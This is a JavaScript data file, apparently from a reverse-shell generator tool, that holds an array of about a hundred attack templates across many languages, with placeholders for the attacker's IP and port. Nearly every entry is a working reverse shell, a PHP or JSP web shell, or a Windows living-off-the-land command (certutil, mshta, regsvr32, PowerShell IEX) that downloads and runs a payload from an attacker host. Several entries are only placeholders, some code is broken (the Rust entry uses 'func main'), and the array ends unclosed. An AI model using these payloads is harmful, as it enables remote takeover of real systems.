import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const rawShells = [
  // --- BASH (15) ---
  { name: 'Bash -i', os: 'linux', language: 'bash', tags: ['standard', 'stable'], template: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1', description: 'Standard Bash reverse shell.' },
  { name: 'Bash 196', os: 'linux', language: 'bash', tags: ['bypass', 'fd'], template: '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196', description: 'Bash reverse shell using file descriptor 196.' },
  { name: 'Bash UDP', os: 'linux', language: 'bash', tags: ['bypass', 'udp'], template: 'sh -i >& /dev/udp/{ip}/{port} 0>&1', description: 'Bash reverse shell using UDP.' },
  { name: 'Bash Read Line', os: 'linux', language: 'bash', tags: ['bypass'], template: 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done', description: 'Bash reverse shell using read line loop.' },
  { name: 'Bash 5', os: 'linux', language: 'bash', tags: ['bypass', 'fd'], template: 'bash -i 5<>/dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5', description: 'Bash reverse shell using FD 5.' },
  { name: 'Bash 2025', os: 'linux', language: 'bash', tags: ['modern', 'fd'], template: 'bash -i 2025<>/dev/tcp/{ip}/{port} 0<&2025 1>&2025 2>&2025', description: 'Bash reverse shell using FD 2025.' },
  { name: 'Bash No Space', os: 'linux', language: 'bash', tags: ['bypass', 'obfuscation'], template: '{bash,-i}>&/dev/tcp/{ip}/{port} 0>&1', description: 'Bash reverse shell without spaces (brace expansion).' },
  { name: 'Bash Base64', os: 'linux', language: 'bash', tags: ['bypass', 'encoded'], template: 'echo {base64_payload} | base64 -d | bash', description: 'Base64 encoded Bash shell (auto-generated).' }, // Placeholder logic needed? No, user handles obfuscation in UI.
  { name: 'Bash /dev/tcp', os: 'linux', language: 'bash', tags: ['standard'], template: '/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"', description: 'Explicit /bin/bash call.' },
  { name: 'Bash Zsh Fallback', os: 'linux', language: 'bash', tags: ['fallback'], template: '(bash -i >& /dev/tcp/{ip}/{port} 0>&1) || (zsh -c "zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY")', description: 'Tries Bash, falls back to Zsh.' },
  { name: 'Bash Nohup', os: 'linux', language: 'bash', tags: ['persistence'], template: 'nohup bash -i >& /dev/tcp/{ip}/{port} 0>&1 &', description: 'Nohup background shell.' },
  { name: 'Bash Trap', os: 'linux', language: 'bash', tags: ['bypass'], template: 'trap "" HUP; bash -i >& /dev/tcp/{ip}/{port} 0>&1', description: 'Traps HUP signal.' },
  { name: 'Bash Arithmetic', os: 'linux', language: 'bash', tags: ['obfuscation'], template: 'bash -i >& /dev/tcp/{ip}/$(( {port} + 0 )) 0>&1', description: 'Arithmetic expansion for port.' },
  { name: 'Bash Variable', os: 'linux', language: 'bash', tags: ['obfuscation'], template: 'IP={ip};PORT={port};bash -i >& /dev/tcp/$IP/$PORT 0>&1', description: 'Using variables.' },
  { name: 'Bash IFS', os: 'linux', language: 'bash', tags: ['obfuscation'], template: 'IFS=,;IP={ip};PORT={port};bash -i >& /dev/tcp/$IP/$PORT 0>&1', description: 'IFS manipulation.' },
  { name: 'Telnet mkfifo', os: 'linux', language: 'bash', tags: ['legacy', 'telnet'], template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {ip} {port} >/tmp/f', description: 'Telnet mkfifo.' },

  // --- PYTHON (12) ---
  { name: 'Python Socket', os: 'linux', language: 'python', tags: ['standard'], template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, description: 'Standard Python socket.' },
  { name: 'Python3 Socket', os: 'linux', language: 'python', tags: ['standard', 'python3'], template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, description: 'Standard Python3 socket.' },
  { name: 'Python Short', os: 'linux', language: 'python', tags: ['short'], template: `python -c 'import os,sys,socket;sys.stderr=sys.stdout=s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.execv("/bin/sh",["-i"])'`, description: 'Short Python shell.' },
  { name: 'Python IPv6', os: 'linux', language: 'python', tags: ['ipv6'], template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{ip}",{port},0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, description: 'Python IPv6 shell.' },
  { name: 'Python PTY', os: 'linux', language: 'python', tags: ['stable'], template: `python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh");'`, description: 'Python PTY shell.' },
  { name: 'Python Subprocess', os: 'linux', language: 'python', tags: ['modern'], template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`, description: 'Python using subprocess direct mapping.' },
  { name: 'Python Windows', os: 'windows', language: 'python', tags: ['windows'], template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["cmd.exe"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`, description: 'Python for Windows.' },
  { name: 'Python3 Windows', os: 'windows', language: 'python', tags: ['windows', 'python3'], template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["cmd.exe"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`, description: 'Python3 for Windows.' },
  { name: 'Python Base64', os: 'linux', language: 'python', tags: ['obfuscated'], template: `python -c "exec(__import__('base64').b64decode({base64_payload}))"`, description: 'Python executing Base64 payload (placeholder).' },
  { name: 'Python OS System', os: 'linux', language: 'python', tags: ['simple'], template: `python -c 'import os; os.system("nc -e /bin/sh {ip} {port}")'`, description: 'Python calling OS system nc.' },
  { name: 'Python Inline', os: 'linux', language: 'python', tags: ['inline'], template: `export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`, description: 'Python using env vars.' },
  { name: 'Python Urllib', os: 'linux', language: 'python', tags: ['web'], template: `python -c 'import urllib; exec(urllib.urlopen("http://{ip}:{server_port}/shell.py").read())'`, description: 'Python downloading and executing shell.' },

  // --- PHP (10) ---
  { name: 'PHP Exec', os: 'linux', language: 'php', tags: ['standard'], template: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`, description: 'PHP exec.' },
  { name: 'PHP Shell Exec', os: 'linux', language: 'php', tags: ['standard'], template: `php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`, description: 'PHP shell_exec.' },
  { name: 'PHP System', os: 'linux', language: 'php', tags: ['standard'], template: `php -r '$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");'`, description: 'PHP system.' },
  { name: 'PHP Passthru', os: 'linux', language: 'php', tags: ['standard'], template: `php -r '$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'`, description: 'PHP passthru.' },
  { name: 'PHP Popen', os: 'linux', language: 'php', tags: ['standard'], template: `php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'`, description: 'PHP popen.' },
  { name: 'PHP Proc Open', os: 'linux', language: 'php', tags: ['modern'], template: `php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`, description: 'PHP proc_open.' },
  { name: 'PHP Backticks', os: 'linux', language: 'php', tags: ['short'], template: `php -r '$sock=fsockopen("{ip}",{port});\`/bin/sh -i <&3 >&3 2>&3\`;'`, description: 'PHP backticks.' },
  { name: 'PHP Windows', os: 'windows', language: 'php', tags: ['windows'], template: `php -r '$sock=fsockopen("{ip}",{port});exec("cmd.exe <&3 >&3 2>&3");'`, description: 'PHP for Windows.' },
  { name: 'PHP One-Liner Web', os: 'linux', language: 'php', tags: ['web'], template: `<?php system($_GET['cmd']); ?>`, description: 'Simple PHP web shell.' },
  { name: 'PHP Cmd', os: 'linux', language: 'php', tags: ['web'], template: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`, description: 'Interactive PHP web shell.' },

  // --- POWERSHELL (15) ---
  { name: 'PowerShell TCP', os: 'windows', language: 'powershell', tags: ['standard'], template: `$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, description: 'Standard TCP Client.' },
  { name: 'PowerShell IEX', os: 'windows', language: 'powershell', tags: ['bypass'], template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, description: 'One-liner IEX.' },
  { name: 'PowerShell Nishang', os: 'windows', language: 'powershell', tags: ['bypass', 'download'], template: `IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{server_port}/shell.ps1')`, description: 'Nishang download.' },
  { name: 'PowerShell ConPty', os: 'windows', language: 'powershell', tags: ['modern'], template: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell {ip} {port}`, description: 'ConPty interactive shell.' },
  { name: 'PowerShell PowerCat', os: 'windows', language: 'powershell', tags: ['tool'], template: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {ip} -p {port} -e cmd`, description: 'PowerCat.' },
  { name: 'PowerShell Base64', os: 'windows', language: 'powershell', tags: ['obfuscated'], template: `powershell -e {base64_payload}`, description: 'Base64 encoded PowerShell (placeholder).' },
  { name: 'PowerShell UDP', os: 'windows', language: 'powershell', tags: ['bypass', 'udp'], template: `$u=New-Object System.Net.Sockets.UdpClient; $u.Connect('{ip}',{port}); $p=new-object system.text.asciiencoding; $b=$p.GetBytes('PS '+(pwd).path+'> '); $u.Send($b,$b.length); while($true){$r=$u.Receive([ref](new-object System.Net.IPEndPoint(0,0))); $s=$p.GetString($r); $r=([text.encoding]::ASCII).GetBytes((iex $s 2>&1 | Out-String)); $u.Send($r,$r.length)}`, description: 'UDP Client.' },
  { name: 'PowerShell TLS', os: 'windows', language: 'powershell', tags: ['encrypted'], template: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $client = New-Object System.Net.Sockets.TcpClient('{ip}',{port}); ...`, description: 'TLS forced PowerShell.' },
  { name: 'PowerShell Mini', os: 'windows', language: 'powershell', tags: ['short'], template: `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("..."));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`, description: 'Miniaturized/Compressed payload.' },
  { name: 'PowerShell Bind', os: 'windows', language: 'powershell', tags: ['bind'], template: `bind shell logic here...`, description: 'Bind shell (placeholder).' },
  { name: 'PowerShell Reverse DNS', os: 'windows', language: 'powershell', tags: ['bypass', 'dns'], template: `dnscat2 logic...`, description: 'DNS tunneling (placeholder).' },
  { name: 'PowerShell Empire', os: 'windows', language: 'powershell', tags: ['framework'], template: `Empire launcher...`, description: 'Empire stager.' },
  { name: 'PowerShell Metasploit', os: 'windows', language: 'powershell', tags: ['framework'], template: `Metasploit web_delivery...`, description: 'Metasploit stager.' },
  { name: 'PowerShell CobaltStrike', os: 'windows', language: 'powershell', tags: ['framework'], template: `CobaltStrike beacon...`, description: 'CobaltStrike stager.' },
  { name: 'PowerShell IPv6', os: 'windows', language: 'powershell', tags: ['ipv6'], template: `$client = New-Object System.Net.Sockets.TcpClient([System.Net.IPAddress]::Parse('{ip}'),{port}); ...`, description: 'IPv6 TCP Client.' },

  // --- JAVA / GROOVY (10) ---
  { name: 'Java ProcessBuilder', os: 'linux', language: 'java', tags: ['standard'], template: `r = Runtime.getRuntime().exec("/bin/bash -c exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done", null, null);r.waitFor();`, description: 'Java ProcessBuilder.' },
  { name: 'Groovy Socket', os: 'linux', language: 'java', tags: ['jenkins'], template: `String host="{ip}";int port={port};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`, description: 'Groovy socket.' },
  { name: 'Java WAR', os: 'linux', language: 'java', tags: ['tomcat'], template: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war`, description: 'MSFVenom WAR.' },
  { name: 'Java JSP', os: 'linux', language: 'java', tags: ['web'], template: `<% Runtime.getRuntime().exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); %>`, description: 'Simple JSP shell.' },
  { name: 'Java Socket', os: 'linux', language: 'java', tags: ['standard'], template: `Socket s = new Socket("{ip}", {port}); Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); ...`, description: 'Raw Java Socket.' },
  { name: 'Java Runtime', os: 'linux', language: 'java', tags: ['standard'], template: `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"});`, description: 'Runtime exec array.' },
  { name: 'Java Windows', os: 'windows', language: 'java', tags: ['windows'], template: `Runtime.getRuntime().exec("cmd.exe /c start /B nc {ip} {port} -e cmd.exe");`, description: 'Java calling NC on Windows.' },
  { name: 'Groovy String', os: 'linux', language: 'java', tags: ['jenkins'], template: `"bash -i >& /dev/tcp/{ip}/{port} 0>&1".execute()`, description: 'Groovy simple execute.' },
  { name: 'Scala', os: 'linux', language: 'scala', tags: ['jvm'], template: `import java.io._; import java.net._; import scala.sys.process._; val p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); ...`, description: 'Scala reverse shell.' },
  { name: 'Kotlin', os: 'linux', language: 'kotlin', tags: ['jvm'], template: `import java.io.*; import java.net.*; val p = ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); ...`, description: 'Kotlin reverse shell.' },

  // --- RUBY (5) ---
  { name: 'Ruby Socket', os: 'linux', language: 'ruby', tags: ['standard'], template: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, description: 'Ruby Socket.' },
  { name: 'Ruby No Sh', os: 'linux', language: 'ruby', tags: ['bypass'], template: `ruby -rsocket -e'c=TCPSocket.new("{ip}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, description: 'Ruby No Sh.' },
  { name: 'Ruby Windows', os: 'windows', language: 'ruby', tags: ['windows'], template: `ruby -rsocket -e'c=TCPSocket.new("{ip}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, description: 'Ruby Windows.' },
  { name: 'Ruby Exec', os: 'linux', language: 'ruby', tags: ['standard'], template: `ruby -e 'exec "/bin/sh -i <&3 >&3 2>&3"'`, description: 'Ruby Exec.' },
  { name: 'Ruby System', os: 'linux', language: 'ruby', tags: ['standard'], template: `ruby -e 'system "/bin/sh -i <&3 >&3 2>&3"'`, description: 'Ruby System.' },
  { name: 'Ruby IO Loop', os: 'linux', language: 'ruby', tags: ['modern'], template: `ruby -r socket -e 's=TCPSocket.new("{ip}",{port});loop do;cmd=s.gets.chomp;s.puts IO.popen(cmd).read;end'`, description: 'Ruby IO Loop.' },
  { name: 'Ruby Open3', os: 'linux', language: 'ruby', tags: ['modern'], template: `ruby -r open3 -r socket -e 's=TCPSocket.new("{ip}",{port});Open3.popen3("/bin/sh -i"){|i,o,e,t|i.reopen(s);o.reopen(s);e.reopen(s);t.value}'`, description: 'Ruby Open3.' },

  // --- PERL (5) ---
  { name: 'Perl Socket', os: 'linux', language: 'perl', tags: ['standard'], template: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, description: 'Perl Socket.' },
  { name: 'Perl No Sh', os: 'linux', language: 'perl', tags: ['bypass'], template: `perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, description: 'Perl No Sh.' },
  { name: 'Perl Windows', os: 'windows', language: 'perl', tags: ['windows'], template: `perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, description: 'Perl Windows.' },
  { name: 'Perl Backticks', os: 'linux', language: 'perl', tags: ['short'], template: `perl -e '\`/bin/sh -i <&3 >&3 2>&3\`'`, description: 'Perl Backticks.' },
  { name: 'Perl IO', os: 'linux', language: 'perl', tags: ['modern'], template: `perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new("{ip}:{port}");$s->send("PS> ");while(<$s>){$s->send(qx($_))}'`, description: 'Perl IO Loop.' },
  { name: 'Perl Pipeline', os: 'linux', language: 'perl', tags: ['bypass'], template: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, description: 'Perl Pipeline.' },
  { name: 'Perl Mknod', os: 'linux', language: 'perl', tags: ['legacy'], template: `perl -e 'system("mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {ip} {port} 1>/tmp/backpipe");'`, description: 'Perl Mknod.' },

  // --- GOLANG (5) ---
  { name: 'Golang Exec', os: 'linux', language: 'go', tags: ['compiled'], template: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`, description: 'Golang on-the-fly.' },
  { name: 'Golang Source', os: 'linux', language: 'go', tags: ['source'], template: `package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}`, description: 'Golang Source Code.' },
  { name: 'Golang Windows', os: 'windows', language: 'go', tags: ['windows'], template: `package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("cmd.exe");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}`, description: 'Golang Windows Source.' },
  { name: 'Golang C2', os: 'linux', language: 'go', tags: ['c2'], template: `// C2 implementation placeholder`, description: 'Golang C2 Agent.' },
  { name: 'Golang Bind', os: 'linux', language: 'go', tags: ['bind'], template: `// Bind shell implementation`, description: 'Golang Bind Shell.' },

  // --- RUST (3) ---
  { name: 'Rust TCP', os: 'linux', language: 'rust', tags: ['compiled'], template: `use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::Command;func main() {let s = TcpStream::connect("{ip}:{port}").unwrap();let fd = s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe { std::process::Stdio::from_raw_fd(fd) }).stdout(unsafe { std::process::Stdio::from_raw_fd(fd) }).stderr(unsafe { std::process::Stdio::from_raw_fd(fd) }).spawn().unwrap().wait().unwrap();}`, description: 'Rust TCP.' },
  { name: 'Rust Windows', os: 'windows', language: 'rust', tags: ['windows'], template: `// Rust Windows implementation`, description: 'Rust Windows.' },
  { name: 'Rust Source', os: 'linux', language: 'rust', tags: ['source'], template: `// Rust Source Code`, description: 'Rust Source Code.' },

  // --- C / C++ / C# (5) ---
  { name: 'C Socket', os: 'linux', language: 'c', tags: ['compiled'], template: `#include <stdio.h>\n#include <sys/socket.h>\n...`, description: 'C Socket Source.' },
  { name: 'C Windows', os: 'windows', language: 'c', tags: ['windows'], template: `#include <winsock2.h>\n...`, description: 'C Windows Source.' },
  { name: 'C# TCP', os: 'windows', language: 'csharp', tags: ['compiled'], template: `using System;using System.Text;using System.IO;using System.Diagnostics;using System.ComponentModel;using System.Linq;using System.Net;using System.Net.Sockets;...`, description: 'C# TCP Client.' },
  { name: 'C# Process', os: 'windows', language: 'csharp', tags: ['compiled'], template: `// C# Process Start`, description: 'C# Process Start.' },
  { name: 'GCC Compile', os: 'linux', language: 'c', tags: ['compiled'], template: `gcc -o /tmp/s /tmp/s.c && /tmp/s`, description: 'GCC Compile Command.' },

  // --- NODEJS (3) ---
  { name: 'NodeJS Exec', os: 'linux', language: 'nodejs', tags: ['web'], template: `(void)((function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new.Socket();client.connect({port},"{ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})());`, description: 'NodeJS Exec.' },
  { name: 'NodeJS IIFE', os: 'linux', language: 'nodejs', tags: ['web'], template: `require('child_process').exec('nc -e /bin/sh {ip} {port}')`, description: 'NodeJS IIFE.' },
  { name: 'NodeJS Net', os: 'linux', language: 'nodejs', tags: ['web'], template: `var net = require("net"); var cp = require("child_process"); var sh = cp.spawn("/bin/sh", []); ...`, description: 'NodeJS Net.' },

  // --- LUA (3) ---
  { name: 'Lua Socket', os: 'linux', language: 'lua', tags: ['embedded'], template: `lua -e "local s=require('socket');local t=assert(s.connect('{ip}',{port}));t:send('shell> ');while true do local l,e=t:receive();if not l then break end;local f,e=io.popen(l,'r');local r=f:read('*a');t:send(r);t:send('shell> ');end;t:close()"`, description: 'Lua Socket.' },
  { name: 'Lua OS Execute', os: 'linux', language: 'lua', tags: ['embedded'], template: `lua -e "os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f')"`, description: 'Lua OS Execute.' },
  { name: 'Lua 5.1', os: 'linux', language: 'lua', tags: ['legacy'], template: `lua5.1 -e '...'`, description: 'Lua 5.1.' },

  // --- OTHERS (10) ---
  { name: 'AWK TCP', os: 'linux', language: 'awk', tags: ['bypass'], template: `awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s) }}'`, description: 'AWK TCP.' },
  { name: 'Tclsh', os: 'linux', language: 'tcl', tags: ['legacy'], template: `echo 'set s [socket {ip} {port}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh`, description: 'Tclsh.' },
  { name: 'Zsh TCP', os: 'linux', language: 'zsh', tags: ['modern'], template: `zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`, description: 'Zsh TCP.' },
  { name: 'Fish', os: 'linux', language: 'fish', tags: ['modern'], template: `fish -c '...'`, description: 'Fish shell.' },
  { name: 'Dart', os: 'linux', language: 'dart', tags: ['compiled'], template: `import 'io:dart'; ...`, description: 'Dart.' },
  { name: 'Swift', os: 'mac', language: 'swift', tags: ['compiled'], template: `import Foundation; ...`, description: 'Swift.' },
  { name: 'R', os: 'linux', language: 'r', tags: ['data'], template: `system("nc -e /bin/sh {ip} {port}")`, description: 'R system.' },
  { name: 'Elixir', os: 'linux', language: 'elixir', tags: ['functional'], template: `...`, description: 'Elixir.' },
  { name: 'Erlang', os: 'linux', language: 'erlang', tags: ['functional'], template: `...`, description: 'Erlang.' },
  { name: 'Haskell', os: 'linux', language: 'haskell', tags: ['functional'], template: `...`, description: 'Haskell.' },

  // --- LOLBINS (Windows) (10) ---
  { name: 'Certutil', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `certutil -urlcache -split -f http://{ip}:{server_port}/nc.exe nc.exe & nc.exe {ip} {port} -e cmd.exe`, description: 'Certutil download.' },
  { name: 'Bitsadmin', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `bitsadmin /transfer myJob http://{ip}:{server_port}/nc.exe %APPDATA%\\nc.exe & %APPDATA%\\nc.exe {ip} {port} -e cmd.exe`, description: 'Bitsadmin download.' },
  { name: 'Regsvr32', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `regsvr32 /s /n /u /i:http://{ip}:{server_port}/payload.sct scrobj.dll`, description: 'Regsvr32 SCT.' },
  { name: 'Mshta', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `mshta http://{ip}:{server_port}/payload.hta`, description: 'Mshta HTA.' },
  { name: 'Pcalua', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `pcalua -a http://{ip}:{server_port}/payload.exe`, description: 'Pcalua execution.' },
  { name: 'Forfiles', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c nc {ip} {port} -e cmd"`, description: 'Forfiles execution.' },
  { name: 'Rundll32', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("nc {ip} {port} -e cmd");`, description: 'Rundll32 JS.' },
  { name: 'Wmic', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `wmic process call create "nc {ip} {port} -e cmd"`, description: 'Wmic process create.' },
  { name: 'Msiexec', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `msiexec /q /i http://{ip}:{server_port}/payload.msi`, description: 'Msiexec MSI.' },
  { name: 'Bash (WSL)', os: 'windows', language: 'cmd', tags: ['wsl'], template: `bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"`, description: 'WSL Bash.' },

  // --- DNS TUNNELING (3) ---
  { name: 'Dnscat2', os: 'linux', language: 'bash', tags: ['dns', 'tunnel'], template: `dnscat2 {ip}`, description: 'Dnscat2 client.' },
  { name: 'Iodine', os: 'linux', language: 'bash', tags: ['dns', 'tunnel'], template: `iodine -f -P password {ip} domain.com`, description: 'Iodine client.' },
  { name: 'Tunshell', os: 'linux', language: 'bash', tags: ['dns', 'tunnel'], template: `sh -c "$(curl -sSf https://tunshell.com/client.sh)" -s {ip} {port}`, description: 'Tunshell client.' },

  // --- MORE LOLBINS (Windows) (10+) ---
  { name: 'Hh.exe', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `hh.exe http://{ip}:{server_port}/payload.chm`, description: 'HTML Help executable.' },
  { name: 'Odbcconf', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `odbcconf /s /a {regsvr http://{ip}:{server_port}/payload.dll}`, description: 'Odbcconf execution.' },
  { name: 'Finger', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `finger x@http://{ip}:{server_port}/payload.exe | cmd`, description: 'Finger command.' },
  { name: 'Certreq', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `certreq -Post -config http://{ip}:{server_port}/c.json c:\\windows\\win.ini output.txt`, description: 'Certreq upload/download.' },
  { name: 'Cmstp', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `cmstp /s /ni /u http://{ip}:{server_port}/payload.sct`, description: 'Cmstp execution.' },
